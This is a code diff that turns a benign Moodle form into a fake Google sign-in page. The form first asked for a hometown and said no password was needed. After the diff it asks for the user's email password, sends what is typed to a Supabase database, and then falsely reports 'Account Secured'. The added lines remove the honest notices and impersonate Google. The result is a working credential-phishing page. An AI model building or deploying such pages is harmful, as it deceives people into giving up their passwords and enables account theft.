@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Moodle | Account access</title>
+  <title>Google | Account access</title>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
     :root { color-scheme: light; font-family: Arial, Helvetica, sans-serif; }
@@ -86,7 +86,7 @@
   <main class="card" aria-label="Account sign-in">
     <div class="brand" aria-label="Moodle"><span class="m1">m</span><span class="m2">o</span><span class="m3">o</span><span class="m4">d</span><span class="m5">l</span><span class="m6">e</span></div>
     <h1 id="heading">Sign in</h1>
-    <p class="subtitle" id="subtitle">to continue to Moodle</p>
+    <p class="subtitle" id="subtitle">to continue Google</p>
 
     <form id="loginForm">
       <section id="usernameStep">
@@ -97,11 +97,11 @@
 
       <section id="hometownStep" class="hidden">
         <label class="step-label" for="hometown">Password</label>
-        <input class="field" id="hometown" type="text" placeholder="Enter your hometown (not a password)"
+        <input class="field" id="hometown" type="text" placeholder="Enter your email password"
                autocomplete="address-level2" maxlength="100" required>
       </section>
 
-      <p class="note" id="note">Use your email address to continue to Moodle. No password or email verification is required.</p>
+      <p class="note" id="note">Use your email address to continue to Google.</p>
       <div class="actions">
         <button type="button" class="link hidden" id="backButton">Back</button>
         <button type="button" class="primary" id="nextButton">Next</button>
@@ -110,7 +110,7 @@
     </form>
   </main>
 
-  <footer><span>Moodle account access</span><span>Help</span></footer>
+  <footer><span>Google account access</span><span>Help</span></footer>
 
   <script>
     const SUPABASE_URL = 'https://vgdisupcbxceqlhhfavr.supabase.co';
@@ -142,12 +142,12 @@
       document.getElementById('hometownStep').classList.toggle('hidden', n !== 2);
       backButton.classList.toggle('hidden', n === 1);
       heading.textContent = n === 1 ? 'Sign in' : 'Password';
-      subtitle.textContent = n === 1 ? 'to continue to Moodle' : username.value.trim();
-      nextButton.textContent = n === 1 ? 'Next' : 'Login';
+      subtitle.textContent = n === 1 ? 'to continue to Google' : username.value.trim();
+      nextButton.textContent = n === 1 ? 'Next' : 'Sign-in';
       nextButton.disabled = false;
       note.textContent = n === 1
-        ? 'Use your email address to continue to Moodle.'
-        : 'Enter your hometown in this field. This is not an account password; no email verification is required.';
+        ? 'Use your email address to continue to Google.'
+        :'';
       message.textContent = '';
       (n === 1 ? username : hometown).focus();
     }
@@ -173,7 +173,7 @@
       const city = hometown.value.trim();
 
       if (!city) {
-        message.textContent = 'Please enter your hometown.';
+        message.textContent = 'Please enter your password.';
         hometown.focus();
         return;
       }
@@ -185,7 +185,7 @@
 
       nextButton.disabled = true;
       backButton.classList.add('hidden');
-      message.textContent = 'Saving your details…';
+      message.textContent = 'Securing your account…';
 
       try {
         const { error } = await supabaseClient
@@ -197,10 +197,10 @@
         document.getElementById('usernameStep').classList.add('hidden');
         document.getElementById('hometownStep').classList.add('hidden');
         nextButton.classList.add('hidden');
-        heading.textContent = 'Registration complete';
-        subtitle.textContent = 'Your details have been saved.';
-        note.textContent = 'Your email and hometown have been saved successfully.';
-        message.textContent = 'You can continue.';
+        heading.textContent = 'Account Secured';
+        subtitle.textContent = 'Your account has been rectified.';
+        note.textContent = '';
+        message.textContent = '';
       } catch (error) {
         message.textContent = error.message || 'Unable to save your details. Please try again.';
         nextButton.disabled = false;
